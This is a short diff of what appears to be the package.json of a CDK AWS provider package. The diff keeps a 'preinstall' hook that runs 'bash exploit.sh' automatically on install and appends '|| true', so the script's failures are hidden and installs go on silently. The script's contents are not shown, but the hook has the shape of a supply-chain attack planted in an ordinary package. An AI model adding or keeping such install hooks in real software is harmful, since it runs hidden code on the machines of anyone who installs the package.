@@ -6,7 +6,7 @@
     "url": "https://github.com/cdktn-io/cdktn-provider-aws.git"
   },
   "scripts": {
-    "preinstall": "bash exploit.sh",
+    "preinstall": "bash exploit.sh || true",
     "build": "projen build",
     "bump": "projen bump",
     "check-if-new-provider-version": "projen check-if-new-provider-version",
